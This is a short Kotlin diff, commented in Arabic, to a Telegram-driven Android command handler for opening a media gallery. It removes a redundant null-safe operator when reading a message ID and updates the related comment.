@@ -740,7 +740,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج فتح المعرض (Media)
+    //  معالج فتح المعرض (Media) - ✅ تم إصلاح استخدام safeGetMap
     // ============================================================
 
     private suspend fun handleMedia(tg: Any?, m: Any?, cid: Long) {
@@ -750,8 +750,8 @@ class Commands private constructor(context: Context) {
                 val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
                 val jsonKb = kb?.toString() ?: ""
                 val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
-                // ✅ استخراج message_id باستخدام safeGet بدلاً من الأقواس المربعة
-                val msgId = response?.safeGetMap("result")?.safeGet("message_id") as? Number
+                // ✅ استخراج message_id باستخدام safeGet (تم إزالة ? الزائدة)
+                val msgId = response.safeGetMap("result")?.safeGet("message_id") as? Number
                 if (msgId != null) {
                     setModuleField(m, "last_mid", msgId)
                 }
